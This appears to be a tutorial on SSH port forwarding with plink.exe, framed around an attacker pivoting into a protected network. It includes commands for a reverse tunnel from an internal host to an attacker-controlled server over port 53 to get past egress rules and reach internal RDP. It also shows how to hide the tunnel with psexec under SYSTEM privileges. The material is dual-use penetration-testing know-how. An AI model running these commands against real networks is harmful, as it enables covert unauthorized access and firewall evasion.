<b>Standard single port forwarding</b><br/>
On host A :<br/>
plink.exe {host-B} -P 22 -C -L 127.0.0.1:444:{host-C}:3389 -l username -pw password<br/>
<br/>
Where:<br/>
{host-b} -P 22 is IP and port of SSH on the host located at border of network .<br/>
-C force compression . in most cases great performance increase , but if you only forward binary and already-compressed protocols , skip it .<br/>
-L 127.0.0.1:444:{host-C}:3389 means , we want normal port-forwarding ( -L ) . First part tells that start point of tunnel will be binded on 127.0.0.1 interface on our host ( A ) and listen on port 444 . So everything is sent to 127.0.0.01:444 will be forwarded to end of tunnel . Second part represents end point of tunnel where our forwarded data will be sent to . Since we want to connect to terminal-service on host C. Mentioning '127.0.0.1' is optional and you can skip it , unless you wan to bind the socket to a specific interface on your system . In such case you should use IP of that interface.<br/>
-l and -pw are obvious . and the main reason we use plink.exe and not putty.exe for example , or any other common client. plink.exe accepts user/pass as a switch but other clients do not ! In cases you should launch forwarder in background or you don`t have interactive shell access , this comes pretty useful . Cause other clients requre interactive shell to enter password , unless you use cert-based authentication which have it`s own problems.<br/>
<br/>
After successful negotiation , you can use same 'mstsc.exe 127.0.0.1:444' to connect to TS on host C . That`s it !<br/>
<br/>
<b>Dynamic SOCKS v4 Proxy</b>&nbsp;<br/>
plink.exe {host-B} -P 22 -C -D 8888 -l username -pw password<br/>
<br/>
-D starts the Dynamic port forwarding feature , AKA SOCKS . Above will make your ssh client a simple socks server which listen to port 8888 for incoming connections . <br/>
<br/>
<b>Remote port forwarding</b>&nbsp;: <br/>
This is the more cool feature , or what we`re going to actually use . Since it`s not usually possible to find a open ssh server on target network ( unless it`s lame target) normal forwarding would not be a possible scenario . Here`s where 'remote' port-forwarding comes handy . <br/>
In remote port-forwarding , the start point of tunnel will be on ssh-server , rather than own client , and the end of tunnel will be the host running ssh-client . In other words , In this scenario , host B runs the ssh-client and connect to a ssh-server outside of protected network . Then a port will be opened on ssh-server and anything sent to ssh-server on that port , will be forwarded to specified destination ( host C in our case ) .<br/>
Noticed the difference ? yes, this way attacker does not need to be able to ssh to any host in protected network . No ssh-server in protected network is even necessary . All we have to be able to execute inside protected network , is a ssh-client , plink.exe for example . Let`s try it :<br/>
<br/>
Assuming that<br/>
&nbsp;We have a ssh-server under our control , running on our own host {host-A} or any server in internet<br/>
&nbsp;ssh server is configured to allow 'remote port forwarding' . This is the case only for OpenSSH running on *nix .<br/>
&nbsp;We have prepared a account which is permitted for doing 'remote' port forwarding. Usually only high privileged users (root) have this .<br/>
&nbsp;At least one host ( host B ) in protected network , have at least one open port in ACL of firewall to be able to connect to servers outside of network . Wise admins usually block all outgoing connections , so 53 maybe your lucky number again .<br/>
&nbsp;SSH server is listening on same port as above . So if only 53/tcp is allowed for outgoing , our ssh-server should be listening on same port .<br/>
<br/>
We`ll run below command on host B :<br/>
plink.exe {host-A} -P 53 -C -R 127.0.0.1:444:{host-C}:3389 -l username -pw password<br/>
<br/>
If you want to connect to tunnel entry point ( port 444 ) on same host as ssh-server , you can again skip 127.0.0.1:444 and use '-R 444:{host-C}:3389' . <br/>
If ssh-server is running another host , say a zombie host , you should exactly specify IP address of interface you want to bind socket to . So if ssh-server is running on 1.2.3.4 , you should use '-R 1.2.3.4:444:{host-C}:3389' .<br/>
Another important note is that , by default ssh-server accepts connections to remote forwarded port ( 444 ) only from localhost ! So check configuration of your client/server on how to config that in correct way . In putty.exe this should be specified with a check mark as below . RTFM for how to do this on your favorite ssh client .<br/>

<br/>
With above option allowed , now you can remotely connect to ssh-server on port 444 and get redirected to internal network and host C on port 3390 . Without that option , it would be possible to connect to port 444 only from the same host as ssh-server .That`s it ! Welcome to internal network .<br/>
<br/>
To run the forwarder ( ssh client , plink.exe for example ) running in background , you can use PsEXEC to execute it hidden in background and with system privileges so it`s not killed by user :<br/>
<br/>
psexec.exe -s -d plink.exe "plink parameters here"<br/>
